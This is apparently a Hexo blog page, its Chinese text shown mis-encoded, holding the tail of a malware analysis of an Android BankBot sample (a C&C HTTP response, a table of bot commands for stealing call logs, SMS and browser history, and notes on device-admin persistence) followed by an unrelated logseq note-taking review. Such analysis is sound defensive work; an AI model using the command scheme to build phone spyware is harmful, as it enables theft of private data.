<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.8.0</span><br><span class="line">Date: Tue, 23 Feb 2016 07:25:30 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/5.5.31</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>è¿”å›çš„å‘½ä»¤ä¸ºjson æ ¼å¼ï¼Œä¸»è¦çš„æŒ‡ä»¤æœ‰ä¸‹é¢å‡ ä¸ªï¼Œ</p>
<table>
<thead>
<tr>
<th>æŒ‡ä»¤</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>401</td>
<td>è¦æ±‚ bot æ³¨å†Œ</td>
</tr>
<tr>
<td>call_log</td>
<td>è·å–ç”µè¯è®°å½•, å‘é€åˆ°C&amp;C server</td>
</tr>
<tr>
<td>sms_history</td>
<td>è·å–çŸ­ä¿¡å†…å®¹ï¼Œå‘é€åˆ°C&amp;C server</td>
</tr>
<tr>
<td>browser_history</td>
<td>è·å–æµè§ˆå™¨ä¹¦ç­¾ï¼Œå‘é€åˆ°C&amp;C server</td>
</tr>
<tr>
<td>url</td>
<td>è®¿é—®url é“¾æ¥</td>
</tr>
<tr>
<td>server</td>
<td>æ›´æ¢C&amp;C server</td>
</tr>
<tr>
<td>intercept</td>
<td></td>
</tr>
<tr>
<td>server_poll</td>
<td>æ›´æ–°ä»æœåŠ¡å™¨è·å–å‘½ä»¤çš„æ—¶é—´é—´éš”</td>
</tr>
<tr>
<td>mayhem</td>
<td></td>
</tr>
<tr>
<td>calls</td>
<td></td>
</tr>
</tbody></table>
<p>ç›‘è§†æœåŠ¡äº†å¤§åŠå¤©ï¼Œæ²¡æœ‰æ”¶åˆ°æœ‰æ•ˆæŒ‡ä»¤ï¼Œçœ‹æ¥ä¸æ˜¯ç‰¹åˆ«æ´»è·ƒã€‚</p>
<h2 id="0x03æ¸…é™¤"><a href="#0x03æ¸…é™¤" class="headerlink" title="0x03æ¸…é™¤"></a>0x03æ¸…é™¤</h2><p>è¿™ä¸ªAppçš„æ¸…é™¤éå¸¸è´¹åŠ²ï¼ŒåŸå› å°±æ˜¯æ³¨å†Œä¸ºè®¾å¤‡ç®¡ç†å™¨çš„appä¸èƒ½å¸è½½ï¼Œè€Œè¿™ä¸ªAppåˆä½¿è¯ˆ<br>ä¸è®©æˆ‘ä»¬å–æ¶ˆè®¾å¤‡ç®¡ç†å™¨ï¼Œä¼°è®¡åªæœ‰rootçš„æœºå™¨ä¼šå¥½å¤„ç†ä¸€äº›ã€‚</p>
<h2 id="0x04æ€»ç»“"><a href="#0x04æ€»ç»“" class="headerlink" title="0x04æ€»ç»“"></a>0x04æ€»ç»“</h2><p>BankBot æ ·æœ¬ï¼Œä»£ç ç¼–å†™çš„ç›¸å½“è§„èŒƒï¼Œé£æ ¼ä¸¥è°¨ï¼Œæ˜¯æ­£è§„ç¨‹åºå‘˜çš„ä½œå“ã€‚ä½†è¡Œä¸ºéå¸¸æµæ°“ï¼Œ<br>å¾ˆé¡½å›ºï¼Œä¸å®¹æ˜“æ¸…é™¤ã€‚æ‰€ä»¥é‡åˆ°ç”³è¯·device admin æƒé™çš„ç¨‹åºä¸€å®šè¦å°å¿ƒè°¨æ…ï¼Œä»¥å…ä¸è‰¯<br>åæœã€‚è€ŒAndroidçš„ç•Œé¢åŠ«æŒä¹Ÿæ˜¯ä¸€ä¸ªä¸¥é‡çš„é—®é¢˜ï¼Œä¼°è®¡åç»­åˆ©ç”¨è¿™äº›æŠ€æœ¯çš„æ¶æ„Appçš„æ•°é‡<br>ä¼šè¶Šæ¥è¶Šå¤šã€‚</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/02/21/logseq/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/21/logseq/" class="post-title-link" itemprop="url">logseq è¯•ç”¨æŠ¥å‘Š</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-21 12:26:29" itemprop="dateCreated datePublished" datetime="2022-02-21T12:26:29+08:00">2022-02-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>æœ€è¿‘åŒé“¾ç¬”è®°çš„æ¦‚å¿µæ¯”è¾ƒç«çƒ­ï¼Œ Roam Research å¤§æ¦‚æ˜¯ç¬¬ä¸€ä¸ªå®ç°æ­¤åŠŸèƒ½çš„è½¯ä»¶ï¼Œåç»­ Notionã€Obsidianã€logseq ç­‰è½¯ä»¶å¤§æ­¥è·Ÿè¿›ï¼Œè¿™äº›è½¯ä»¶å„æœ‰åƒç§‹ã€‚ä¸‹é¢è¿™æ®µæ˜¯å‚è€ƒèµ„æ–™æ–‡ç« ä¸­çš„ä¸€å°æ®µï¼Œå¾ˆæœ‰å‚è€ƒæ„ä¹‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Roam çš„çªç ´åœ¨äºï¼Œç†è®ºä¸Šï¼ŒæŠŠè½¯ä»¶è®¾è®¡ç†å¿µä¸å¡ç‰‡ç›’ç¬”è®°æ³•ç´§ç´§æ†ç»‘ï¼š</span><br><span class="line">å¢æ›¼ï¼ˆNiklas Luhmannï¼‰å¾—ç›Šäºå¡ç‰‡ç›’ç¬”è®°æ³•ï¼Œä»å…¬åŠ¡å‘˜æˆä¸ºå¾·å›½å½“ä»£é‡è¦çš„ç¤¾ä¼šå­¦å®¶ï¼Œ</span><br><span class="line">å› æ­¤åŸºäºå¡ç‰‡ç›’ç¬”è®°æ³•çš„ Roam ä¹Ÿå¯ä»¥åŠ©åŠ›ä½ çš„æˆåŠŸï¼›</span><br><span class="line">æŠ€æœ¯ä¸Šï¼Œæ¨å‡ºåŒå‘é“¾æ¥ã€å¯è§†åŒ–ç¬”è®°é—´çš„è”ç³»ã€åµŒå…¥ï¼ˆTransclusionï¼‰ç­‰åŠŸèƒ½ï¼Œ</span><br><span class="line">è®©ç”Ÿäº§ã€æŸ¥æ‰¾ç¬”è®°æ›´åŠ é«˜æ•ˆï¼Œäºæ­¤åŒæ—¶ï¼Œè¿˜çœå´ç»´æŠ¤å±‚çº§ç»“æ„çš„éº»çƒ¦ã€‚</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/henices/pictures/raw/master/logseq0.jpg"><br><img src="https://github.com/henices/pictures/raw/master/logseq1.png"></p>
<p>ä¸Šé¢ä¸¤å¼ å›¾ç‰‡å°±æ˜¯<strong>å¡ç‰‡ç›’ç¬”è®°æ³•</strong> æœ€å½¢è±¡çš„è¡¨ç¤ºäº†ï¼Œä¸ªäººè§‰å¾—è¿™ç§æ–¹æ³•å¾ˆé€‚åˆè‡ªå·±ã€‚</p>
<p>ä¸ºäº†ä½“éªŒåŒé“¾ç¬”è®°ï¼Œæˆ‘èŠ±è´¹äº†ä¸å°‘æ—¶é—´ï¼Œä¸Šé¢çš„å‡ ä¸ªè½¯ä»¶éƒ½ä½“éªŒäº†ä¸€ä¸‹ï¼ŒRoam æ˜¯æ”¶è´¹è½¯ä»¶ï¼Œé“¶å­ä¸å¤Ÿæ‰€ä»¥ä¸é€‰ï¼ŒNotion ç¬”è®°å­˜å‚¨åœ¨äº‘ç«¯ï¼Œä¸ç¬¦åˆæˆ‘æ•°æ®å®‰å…¨çš„è¦æ±‚ä¹Ÿä¸é€‰ï¼Œå‰©ä¸‹çš„å°±åªæœ‰ä¸¤ä¸ªé€‰é¡¹äº† Obsidian å’Œ logseq ã€‚</p>
<h2 id="Obsidian"><a href="#Obsidian" class="headerlink" title="Obsidian"></a>Obsidian</h2><p>è½¯ä»¶ä¸»é¡µï¼š<a target="_blank" rel="noopener" href="https://obsidian.md/">https://obsidian.md/</a><br><img src="https://github.com/henices/pictures/raw/master/logseq2.png"></p>
<p>æŒºå¤šäººé€‰æ‹©ç”¨ Obsidian çš„åŸå› æ˜¯å®ƒçš„ MarkDown è¯­æ³•æ”¯æŒå¾—æ¯”è¾ƒå¥½ï¼ŒMarkDown è¯­æ³•æœ‰å¾ˆå¤šçš„ä½¿ç”¨è€…ï¼Œç±»ä¼¼ Typora çš„ MarkDown è¯­æ³•ç¬”è®°æ˜¯å½“å‰ç¬”è®°è½¯ä»¶çš„ä¸»æµï¼Œè¿™ä½¿å¾—è¿™äº›ç¬”è®°è½¯ä»¶çš„ä½¿ç”¨è€…è¿‡æ¸¡åˆ° obsidian ä¼šæ¯”è¾ƒå¹³æ»‘ã€‚æˆ‘æ˜¯å¼€æº<br>MarkDown ç¬”è®°è½¯ä»¶ Vnote çš„é‡åº¦ä½¿ç”¨è€…ï¼Œä¸€åº¦æƒ³ä½¿ç”¨ Obsidian ä½œä¸ºä¸»åŠ›è½¯ä»¶ã€‚</p>
<p>Obsidian æœ‰æŒºå¤šä¼˜ç‚¹ï¼Œæ¯”å¦‚å®ƒå¯¹ä¸ªäººç”¨æˆ·æ°¸ä¹…å…è´¹ï¼Œä½†æ˜¯å®ƒä¸å¼€æºï¼Œè€Œä¸” <a target="_blank" rel="noopener" href="https://help.obsidian.md/How+to/Link+to+blocks">Link+to+blocks</a> çš„è¯­æ³•æ¯”è¾ƒåˆ«æ‰­ã€‚æœ€ç»ˆè¿˜æ˜¯æ²¡æœ‰é€‰æ‹©å®ƒï¼Œæœ‰äººè¯´Obsidina æ’ä»¶éå¸¸ä¸°å¯Œï¼Œæˆ‘è‡ªå·±æ²¡æœ‰æŠ˜è…¾è¿‡ã€‚</p>
<h2 id="logseq"><a href="#logseq" class="headerlink" title="logseq"></a>logseq</h2><p>è½¯ä»¶ä¸»é¡µï¼š<a target="_blank" rel="noopener" href="https://logseq.com/">https://logseq.com/</a><br>æºç ä»“åº“ï¼š<a target="_blank" rel="noopener" href="https://github.com/logseq/logseq">https://github.com/logseq/logseq</a></p>
<p><img src="https://github.com/henices/pictures/raw/master/logseq3.png"></p>
<p>è¯´äº†è¿™ä¹ˆä¹…ç»ˆäºåˆ°æ­£ä¸»äº†ï¼Œç¬¬ä¸€æ¬¡çŸ¥é“åŒé“¾ç¬”è®°è¿™ä¸ªæ¦‚å¿µæ˜¯å› ä¸ºæœ‰ä¸ªç½‘å‹åœ¨ç½‘ä¸Šè¯´ä½¿ç”¨æ•ˆæœä¸é”™ï¼Œè¿‡æ¸¡å¾ˆå¹³æ»‘ã€‚å¯èƒ½æœ‰å…ˆå…¥ä¸ºä¸»çš„å…³ç³»ï¼Œå¦å¤–æˆ‘æœ¬äººå¯¹å¼€æºè½¯ä»¶ä¸€å‘æœ‰è«åçš„å¥½æ„Ÿï¼Œæ‰€ä»¥ä¸»è§‚æ„è¯†ä¸Šå°±å¾ˆå–œæ¬¢è¿™ä¸ªè½¯ä»¶ã€‚logseq çš„ç²’åº¦è¶³å¤Ÿï¼Œblock reference ä½¿ç”¨éå¸¸æ–¹ä¾¿ï¼Œå¦å¤– logseq çš„ PDF æ ‡è®°åŠŸèƒ½å¯¹äºéœ€è¦å¤§é‡é˜…è¯»è®ºæ–‡çš„æˆ‘æ¥è¯´éå¸¸å¥½ç”¨ã€‚</p>
<p><img src="https://github.com/henices/pictures/raw/master/logseq4.png"></p>
<p>ä½†æ˜¯ logseq ä¹Ÿä¸æ˜¯æ²¡æœ‰ç¼ºç‚¹ï¼Œlogseq å¯¹ markdown è¯­æ³•çš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œå³ä½¿ç›´æ¥å¯¼å…¥ MarkDown æ–‡ä»¶ï¼Œæœ€åæ˜¾ç¤ºçš„ç»“æœæ„Ÿè§‰ä¹Ÿæ˜¯æœ‰é—®é¢˜ï¼Œå„ç±»æ ‡é¢˜ç›´æ¥è½¬åŒ–æˆ block äº†ï¼Œè¿™æ˜¯æœ‰é—®é¢˜çš„ã€‚ä½†æ˜¯ä»è¿™ä¸ªè§’åº¦è¯´ logseq å°±æ˜¯ä¸€ä¸ªçº¯ç²¹çš„åŒé“¾ç¬”è®°è½¯ä»¶è€Œä¸æ˜¯ä¸€ä¸ªæ·»åŠ äº†åŒé“¾åŠŸèƒ½çš„ MarkDown ç¬”è®°è½¯ä»¶ã€‚</p>
<h2 id="æœ€ç»ˆçš„ç¬”è®°ç®¡ç†æ–¹æ³•"><a href="#æœ€ç»ˆçš„ç¬”è®°ç®¡ç†æ–¹æ³•" class="headerlink" title="æœ€ç»ˆçš„ç¬”è®°ç®¡ç†æ–¹æ³•"></a>æœ€ç»ˆçš„ç¬”è®°ç®¡ç†æ–¹æ³•</h2><p>è¯´åˆ°è¿™ï¼Œé—®é¢˜å°±ç®€åŒ–äº†ï¼Œå¹³æ—¶çš„æ–‡æ¡£è®°å½•ä»ç„¶ä½¿ç”¨ MarkDown ç¬”è®°è½¯ä»¶ï¼Œåªæ˜¯åœ¨å¹³æ—¶è®°å½•çš„æ—¶å€™ä½¿ç”¨åŒé“¾ç¬”è®°è½¯ä»¶ã€‚è¿™æ ·çš„ç¬”è®°ç®¡ç†æ–¹æ³•çœ‹ä¸Šå»æ¯”è¾ƒéº»çƒ¦ï¼Œå…¶å®å´å¾ˆå®Œç¾ï¼Œæƒ³å†™æ–‡ç« çš„æ—¶å€™ç›´æ¥ç”¨ VNoteï¼Œå¹³æ—¶çŸ¥è¯†ç§¯ç´¯è®°å½•çš„æ—¶å€™å°±ç”¨ logseqï¼Œæ ¹æœ¬å°±ä¸ç”¨è¿‡æ¸¡ï¼Œåªéœ€è¦å¯ç”¨ä¸€ä¸ªæ–°è½¯ä»¶å³å¯ã€‚</p>
<p>åŸºäº block çš„åŒé“¾ç¬”è®°æœ€å¤§çš„å¥½å¤„å°±æ˜¯æ²¡æœ‰è¾“å‡ºè´Ÿæ‹…ï¼Œä¸€äº›å¾ˆéšæ„çš„æƒ³æ³•éƒ½å¯ä»¥è®°å½•ä¸‹æ¥ï¼Œå› ä¸ºå¤§å®¶ç¡®å®ä¸å¯èƒ½æ¯æ¬¡éƒ½æœ‰å¤§æ®µçš„æƒ³æ³•å¯ä»¥è¾“å‡ºã€‚æœ‰äººè¯´ç”¨ logseqä¸€å¹´å†™äº† 30ä¸‡å­—ï¼Œæˆ‘å¼€å§‹è§‰å¾—æœ‰ç‚¹å¤¸å¼ ï¼Œä½†æ˜¯ä½¿ç”¨ä¸€ä¸ªå¤šæœˆå‘ç°å¯èƒ½å±å®ï¼Œç°åœ¨æˆ‘è‡ªå·±éƒ½å†™äº†å‡ ä¸‡å­—äº†ã€‚æ¯ä¸ªæƒ³æ³• (block) ä¹‹é—´å¯èƒ½ä¼šæœ‰è”ç³»ï¼Œä¸æ–­è®°å½•æƒ³æ³•ï¼Œä¸æ–­è”ç³»ï¼Œæ…¢æ…¢çš„çœŸèƒ½å‘ç°ä¸€äº›æ„æƒ³ä¸åˆ°çš„ä¸œè¥¿ä¹‹é—´å±…ç„¶æœ‰è”ç³»ï¼Œè€Œè¿™äº›è”ç³»å¾ˆæœ‰å¯èƒ½æ˜¯ä¸€äº›å…³é”®çš„åº•å±‚é€»è¾‘ã€‚å¹³æ—¶åœ¨è®°å½•çš„æ—¶å€™æ‰‹å·¥åˆ’åˆ†ç›®å½•ï¼Œå±‚æ¬¡å…³ç³»ï¼Œå…¶å®å·²ç»å°†ä¸€äº›æƒ³æ³•ï¼Œæ¦‚å¿µç»™é€»è¾‘åŒ–äº†ï¼Œè¿™æ ·çš„è®°å½•æ–¹æ³•å¾ˆéš¾æ‘†è„±å›ºæœ‰çš„è®¤çŸ¥ï¼Œè€ŒåŸºäº block çš„åŒé“¾ç¬”è®°å°±è‡ªç”±çš„å¤šï¼Œä¸æ–­è®°å½•ï¼Œä¸æ–­æ•´ç†ï¼Œæ±‡æ€»å°±äº¤ç»™è½¯ä»¶æ¥å®Œæˆå§ã€‚</p>
<p>æˆ‘ç°åœ¨å·²ç»é€šè¿‡ logseq çš„è®°å½•æƒ³æ¸…æ¥šäº†ä¸€äº›é—®é¢˜ï¼Œåœ¨å¹³æ—¶çš„å·¥ä½œè®°å½•ä¸­ä¹Ÿä¸æ–­åœ°ç¨³æ­¥èºæ—‹æ¨è¿›ï¼Œåœ¨æ­¤å‘å¤§å®¶æ¨èè¿™æ¬¾ç¬”è®°è½¯ä»¶ã€‚</p>
<h2 id="æœ€åçš„è¯"><a href="#æœ€åçš„è¯" class="headerlink" title="æœ€åçš„è¯"></a>æœ€åçš„è¯</h2><p>å…¶å®å·¥å…·å¹¶ä¸æ˜¯é‚£ä¹ˆé‡è¦ï¼Œæœ€é‡è¦çš„è¿˜æ˜¯å¹³æ—¶è¦è®°å½•ï¼Œè¦å®šæœŸè¾“å‡ºã€‚IT ç•Œæœ‰ä¸€ä¸ªè‘—åçš„æ®µå­ï¼Œä½ ä»¥ä¸ºä½ æ˜¯åœ¨å†™ blog å…¶å®ä½ åªæ˜¯åœ¨æŠ˜è…¾ wordpress ï¼šï¼‰</p>
<p>å…±å‹‰ã€‚</p>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a target="_blank" rel="noopener" href="https://sspai.com/post/69503">åŒé“¾ç¬”è®°è½¯ä»¶æ¨èï¼šLogseq å’Œå®ƒçš„äº”ç§ç”¨æ³•</a><br><a target="_blank" rel="noopener" href="https://sspai.com/post/65273">è¯·ä¸è¦ç¥åŒ–åŒé“¾ç¬”è®°</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">henices</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
